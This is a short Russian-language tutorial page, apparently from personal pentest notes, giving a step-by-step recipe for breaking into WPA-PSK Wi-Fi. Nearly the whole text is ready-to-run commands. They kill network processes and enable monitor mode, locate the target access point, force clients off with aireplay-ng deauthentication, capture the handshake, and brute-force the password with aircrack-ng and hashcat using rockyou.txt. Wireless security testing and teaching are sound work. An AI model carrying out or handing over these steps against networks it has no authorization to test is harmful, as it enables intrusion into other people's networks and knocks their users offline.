---
description: Здесь описан перехват рукопожатия
---

# WPA-PSK

| Здесь и далее очень важно                                                                         |
| ------------------------------------------------------------------------------------------------- |
| Мы должны обязательно отключить NetworkManager и любые другие процессы, которые нам могут мешать: |

Выключить NetworkManager:

```bash
sudo systemctl stop NetworkManager
```

Проверить и убить все мешающие процессы:

```bash
sudo airmon-ng check kill
```

Для перехвата рукопожатия нам необходимо сначала установить на каком канале сидит точка доступа. Для этого переводим наш адаптер в режим монитора (расчехляем метлу):

```bash
sudo iwconfig wlan0 mode monitor
```

Если не сработало, то пробуем более мощное средство:

```bash
sudo iw wlan0 set monitor control
```

После этого запускаем поиск нужной точки:

```bash
sudo airodump-ng wlan0
```

Ищем строчку с целевой точкой доступа, потом обращаем внимание на столбец CH - номер канала.

Далее перезапускаем тулзу на нужном канале и начинаем записывать трафик для того чтобы потом иметь возможность брутить:

```bash
sudo airodump-ng wlan0 -c <номер канала> -w <название файлов>
```

В нижней таблице высматриваем клиентов точки доступа

Деаутентификацию можно сделать с помощью следующей команды:

```bash
sudo aireplay-ng -0 0 -a <MAC адрес точки доступа> -c <MAC адрес клиента> wlan0
```

После этого в окне, где открыт airodump-ng должно появиться сообщение типа "Handshake cuptur"

Далее нужно брутить захваченное рукопожатие:

```bash
sudo aircrack-ng <file name>.cap -w /usr/share/wordlists/rockyou.txt
```

Для того чтобы брутить трушно на видеокартах нам необходимо с полученным файлом сделать некоторые манипуляции:

```bash
sudo apt install hashcat-utils
```

В Kali вроде уже установлено.

После этого:

```bash
/usr/lib/hashcat-utils/cap2hccapx.bin <file name input>.cap output.hccapx <ESSID>
```

Запускаем брут:

```bash
hashcat -m 2500 output.hccapx /usr/share/wordlists/rockyou.txt
```

Если не получилось, можно попробовать один из способов дальше. Если получилось не забываем сказать "**шалость удалась**".
